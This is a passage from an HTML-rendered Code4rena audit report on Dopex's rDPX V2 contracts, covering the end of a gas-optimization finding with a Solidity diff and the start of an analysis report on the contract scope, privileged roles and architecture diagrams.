class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">101</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_rdpx</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_perpetualAtlanticVault</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">).</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_perpetualAtlanticVault</span><span class=\"mtk1\">, </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Note, we have the values , <code>_rdpx and ERC20(_collateral)</code>, instead of calling their state counterparts <code>rpdx and collateral</code> we should utilize the local ones(Even better we could have just changed them into immutable)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"154\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    collateral.approve(_perpetualAtlanticVault, type(uint256).max);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ERC20(rdpx).approve(_perpetualAtlanticVault, type(uint256).max);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ERC20(_collateral).approve(_perpetualAtlanticVault, type(uint256).max);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ERC20(_rdpx).approve(_perpetualAtlanticVault, type(uint256).max);</span></span></span></code></pre>\n<h2 id=\"conclusion-1\" style=\"position:relative;\"><a href=\"#conclusion-1\" aria-label=\"conclusion 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>It is important to emphasize that the provided recommendations aim to enhance the efficiency of the code without compromising its readability. We understand the value of maintainable and easily understandable code to both developers and auditors.</p>\n<p>As you proceed with implementing the suggested optimizations, please exercise caution and be diligent in conducting thorough testing. It is crucial to ensure that the changes are not introducing any new vulnerabilities and that the desired performance improvements are achieved. Review code changes, and perform thorough testing to validate the effectiveness and security of the refactored code.</p>\n<p>Should you have any questions or need further assistance, please don’t hesitate to reach out.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1942#issuecomment-1742026115\">witherblock (Dopex) confirmed</a></strong></p>\n<p><em>Note: for full discussion, see <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1942\">here</a>.</em></p>\n<hr>\n<h1 id=\"audit-analysis\" style=\"position:relative;\"><a href=\"#audit-analysis\" aria-label=\"audit analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Audit Analysis</h1>\n<p>For this audit, 14 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1887\">report highlighted below</a> by <strong>catellatech</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1988\">nirlin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1795\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1498\">RED-LOTUS-REACH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/995\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2022\">mark0v</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2003\">bitsurfer</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1927\">hunter_w3b</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1841\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1338\">LokiThe5th</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1158\">rjs</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/849\">rokinot</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/637\">0xnev</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/486\">K42</a>.</em></p>\n<h2 id=\"description-overview-of-dopex-protocol\" style=\"position:relative;\"><a href=\"#description-overview-of-dopex-protocol\" aria-label=\"description overview of dopex protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description overview of Dopex Protocol</h2>\n<p>The <code>Dopex protocol</code> has introduced a new version called <code>rDPX V2</code>, which brings an interesting way to reward those who <code>write options</code> on their platform using a rebate system. Additionally, they’ve created a new synthetic coin called <code>dpxETH</code>, which is tied to the price of <code>ETH</code>. The idea behind this coin is to use it for earning higher yields with <code>ETH</code> and as a collateral asset for future options products on <code>Dopex</code>.</p>\n<p>The bonding process in <code>rDPX V2</code> is how new <code>dpxETH</code> coins can be created. When someone bonds, they receive a <code>\"receipt\"</code> that represents a combination of <code>ETH</code> and <code>dpxETH</code> in a system called <code>Curve</code>. Through this bonding process, new <code>dpxETH</code> coins are minted, and to ensure they always have backing, there are <code>reserves</code> of <code>rDPX</code> and <code>ETH</code> called <code>\"Backing Reserves.\"</code> These reserves are controlled by entities called <code>\"AMOs.\"</code></p>\n<p>To achieve a safe and controlled scaling of <code>rDPX V2</code> and <code>dpxETH</code>, the protocol has adopted an idea called <code>\"AMO ideology\"</code> from <code>Frax Finance</code>, which is another similar project. Essentially, they are drawing inspiration from how <code>Frax Finance</code> manages its system to ensure that the new version of <code>Dopex</code> can grow and operate in a stable and sustainable manner.</p>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282842423-6be2d687-e65b-4a3b-bf38-df6be8ec5054.png\" alt=\"Dopex1\"></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282842588-70cc6c98-b0bc-4459-82e8-226923e8a5d9.png\" alt=\"Dopex2\"></p>\n<h2 id=\"1--approach-we-followed-when-reviewing-the-code\" style=\"position:relative;\"><a href=\"#1--approach-we-followed-when-reviewing-the-code\" aria-label=\"1  approach we followed when reviewing the code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1- Approach we followed when reviewing the code</h2>\n<p>To begin, we assessed the code’s scope, which guided our approach to reviewing and analyzing the project.</p>\n<h3 id=\"scope-1\" style=\"position:relative;\"><a href=\"#scope-1\" aria-label=\"scope 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>Scope</strong></h3>\n<ul>\n<li>\n<ol>\n<li><strong>UniV2LiquidityAMO.sol</strong>:</li>\n<li>This contract is utilized to manage liquidity in the <code>Uniswap V2</code> token pair, as well as to execute automated exchange operations. The contract encompasses administrative functions, AMO (Automated Market Maker Operator) functions, and view functions to oversee a variety of liquidity-related operations and token exchanges.</li>\n</ol>\n</li>\n<li>\n<ol start=\"2\">\n<li><strong>UniV3LiquidityAmo.sol</strong>:</li>\n<li>This contract is designed to interact with the <code>Uniswap V3</code> protocol and perform liquidity management operations.</li>\n</ol>\n</li>\n<li>\n<ol start=\"3\">\n<li><strong>RdpxV2Core.sol</strong>:</li>\n<li>This contract is the core of the protocol and is responsible for managing crucial operations such as interacting with <code>delegates</code>, <code>asset management</code>, <code>option settlement</code>, <code>balance synchronization</code>, and <code>repeg handling</code>. Internal <code>_validate</code> functions are used to check conditions throughout the contract and generate exceptions if a condition is not met. This contract ensures that operations are carried out in an authorized manner and in accordance with predefined protocol rules.</li>\n</ol>\n</li>\n<li>\n<ol start=\"4\">\n<li><strong>RdpxV2Bond.sol</strong>:</li>\n<li>this contract defines an <code>ERC721-based</code> NFT token with the ability to <code>mint</code> new tokens, <code>pause/unpause</code> token transfers, and enforce checks during token transfers. It leverages functionality from various <code>OpenZeppelin</code> contracts to implement these features.</li>\n</ol>\n</li>\n<li>\n<ol start=\"5\">\n<li><strong>RdpxDecayingBonds.sol</strong>:</li>\n<li><code>RdpxDecayingBonds</code> contract provides a way to <code>mint</code> and manage decaying <code>rDPX bonds</code> as non-fungible tokens. Users with specific roles can create bonds, perform emergency withdrawals, and query the bonds they own. The contract is designed to be paused in critical situations and features a structure that ensures security and control over operations at all times.</li>\n</ol>\n</li>\n<li>\n<ol start=\"6\">\n<li><strong>DpxEthToken.sol</strong>:</li>\n<li>This contract defines a synthetic token with <code>ERC-20</code> functionalities and adds features for <code>pausing</code>, <code>minting</code>, and <code>burning</code> tokens. The contract leverages <code>role-based</code> access control to manage the interactions and operations on the token.</li>\n</ol>\n</li>\n<li>\n<ol start=\"7\">\n<li><strong>PerpetualAtlanticVault.sol</strong>:</li>\n<li>This contract represent a vault for perpetual atlantic <code>rDPX</code> PUT options. It is designed to handle option issuance, settlement, and funding calculation. The contract utilizes various roles and <code>OpenZeppelin</code> libraries to ensure its functionality and security.</li>\n</ol>\n</li>\n<li>\n<ol start=\"8\">\n<li><strong>PerpetualAtlanticVaultLP.sol</strong>:</li>\n<li>this contract handles liquidity provision for the <code>PerpetualAtlanticVault</code> contract, allowing users to deposit and withdraw assets, while also managing aspects related to the <code>PerpetualAtlanticVault</code> contract and calculating conversions and previews for operations. And use the standard <code>ERC4626</code>.</li>\n</ol>\n</li>\n<li>\n<ol start=\"9\">\n<li><strong>ReLPContract.sol</strong>:</li>\n<li>this contract manages the process of <code>re-liquidity</code> provisioning for a DEX pair using the <code>Uniswap V2</code> protocol. It calculates the optimal amount of Token A <code>reLP</code> to remove from the pool, performs swaps, and adds the new liquidity back to the pool. The contract is designed to ensure efficient and accurate <code>re-liquidity</code> provision while syncing balances with other relevant contracts.</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"privileged-roles\" style=\"position:relative;\"><a href=\"#privileged-roles\" aria-label=\"privileged roles permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Privileged Roles</h3>\n<p>There are several important roles in the system.</p>\n<ul>\n<li>\n<p><strong>DEFAULT_ADMIN_ROLE</strong>: This role is essential in every contract. It grants administrative permissions and control over critical functions. The holder of this role can manage other roles, configure contract parameters, and perform various administrative tasks.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"155\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_setupRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEFAULT_ADMIN_ROLE</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"156\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">- **MANAGER\\_ROLE**: This role is present in the [PerpetualAtlanticVault](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol) contract. It is used for general contract management, including setting addresses, adjusting parameters, and controlling administrative functions. The manager role helps ensure proper operation and configuration.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">```Solidity</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> bytes32 public constant MANAGER_ROLE = keccak256(&quot;MANAGER_ROLE&quot;);</span></span></code></pre>\n<ul>\n<li>\n<p><strong>MINTER_ROLE</strong> - <strong>PAUSER_ROLE</strong> - <strong>BURNER_ROLE</strong> :Found in contracts like <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/dpxETH/DpxEthToken.sol\">DpxEthToken</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/decaying-bonds/RdpxDecayingBonds.sol\">RdpxDecayingBonds</a> and <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Bond.sol\">RdpxV2Bond</a> this role permits the creation or minting of new tokens or bonds. It’s important for controlling the issuance of new tokens, maintaining the token supply, and potentially providing incentives.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"157\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PAUSER_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;PAUSER_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MINTER_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MINTER_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BURNER_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;BURNER_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n</li>\n</ul>\n<p>Initially, the <code>accounts</code> responsible for fully controlling these <code>roles</code> will be managed by the <code>Dopex</code> team as confirmed by the sponsor </p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"shell\" data-index=\"158\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Psytama — 31/08/2023 at 7:24. </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Yes, they will be controlled by the protocol through a multisig. </span></span></code></pre>\n<p>Given the level of control that these <code>roles</code> possess within the system, users must place full trust in the fact that the entities overseeing these <code>roles</code> will always act correctly and in the best interest of the <code>system</code> and its <code>users</code>.</p>\n<p>After grasping the code’s functionality, we carefully analyzed and audited it step by step. Our goal was to ensure its security and proper operation.</p>\n<h2 id=\"2--analysis-of-the-code-base\" style=\"position:relative;\"><a href=\"#2--analysis-of-the-code-base\" aria-label=\"2  analysis of the code base permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2- Analysis of the code base</h2>\n<p>The main most important contracts of <code>rDPX V2</code>.</p>\n<ul>\n<li>Here’s a detailed diagrams of the essential components of these contracts:</li>\n</ul>\n<h3 id=\"1-rdpxv2core\" style=\"position:relative;\"><a href=\"#1-rdpxv2core\" aria-label=\"1 rdpxv2core permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. RdpxV2Core:</h3>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282842945-68a7291a-dbc3-46eb-8923-43e608d7832a.png\" alt=\"Dopex3Core\"></p>\n<h3 id=\"2-perpetualatlanticvault\" style=\"position:relative;\"><a href=\"#2-perpetualatlanticvault\" aria-label=\"2 perpetualatlanticvault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. PerpetualAtlanticVault:</h3>\n<p><img src=\"https://github.com/catellaTech/dopex/blob/main/Dopex4.drawio.png?raw=true\" alt=\"Dopex4\"></p>\n<h3 id=\"3-perpetualatlanticvaultlp\" style=\"position:relative;\"><a href=\"#3-perpetualatlanticvaultlp\" aria-label=\"3 perpetualatlanticvaultlp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>3. PerpetualAtlanticVaultLP:</h3>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282843030-b409b8d3-f285-43ce-8784-74b39a6d993a.png\" alt=\"Dopex5LP\"></p>\n<h3 id=\"4-univ3liquidityamo\" style=\"position:relative;\"><a href=\"#4-univ3liquidityamo\" aria-label=\"4 univ3liquidityamo permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>4. UniV3LiquidityAmo:</h3>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282843123-c6da1ece-4cb8-46e5-a3a5-32447ef4c618.png\" alt=\"Dopex7UniV3\"></p>\n<h3 id=\"5-rdpxv2bond\" style=\"position:relative;\"><a href=\"#5-rdpxv2bond\" aria-label=\"5 rdpxv2bond permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>5. RdpxV2Bond:</h3>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282843235-5e39e9cb-231f-4e01-85ce-d1e5f7337611.png\" alt=\"Dopex8Bond\"></p>\n<h3 id=\"6-rdpxdecayingbonds\" style=\"position:relative;\"><a href=\"#6-rdpxdecayingbonds\" aria-label=\"6 rdpxdecayingbonds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>6. RdpxDecayingBonds:</h3>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282843352-f1728226-acf4-477a-bf99-d31099c6c023.png\" alt=\"Dopex9Decay\"></p>\n<h3 id=\"7-relpcontract\" style=\"position:relative;\"><a href=\"#7-relpcontract\" aria-label=\"7 relpcontract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>7. 